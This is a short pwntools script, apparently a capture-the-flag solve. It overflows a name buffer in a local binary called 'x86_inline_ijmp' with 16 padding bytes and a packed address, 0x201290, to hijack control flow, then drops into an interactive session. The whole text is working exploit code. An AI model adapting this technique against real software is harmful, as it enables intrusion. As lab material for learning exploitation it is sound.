from pwn import *
context.log_level = "debug"
r = process('./x86_inline_ijmp')
vul_addr='a'*16+p64(0x201290)
r.recvuntil("plz input your name:\n")
r.sendline(vul_addr)
r.interactive()


